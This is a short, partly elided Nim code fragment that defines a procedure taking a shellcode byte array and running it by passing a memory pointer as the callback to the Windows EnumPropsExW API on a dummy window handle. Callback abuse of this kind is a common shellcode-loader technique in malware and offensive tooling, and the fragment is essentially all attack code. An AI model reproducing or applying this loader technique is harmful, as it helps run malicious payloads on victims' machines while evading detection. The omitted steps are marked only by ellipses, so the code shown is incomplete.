...
proc enumPropsExW[byte](shellcode: openArray[byte]): void =
  ...
  let dummy = GetTopWindow(cast[HWND](NULL))
  EnumPropsExW(dummy, cast[PROPENUMPROCEXW](rPtr), cast[LPARAM](NULL))
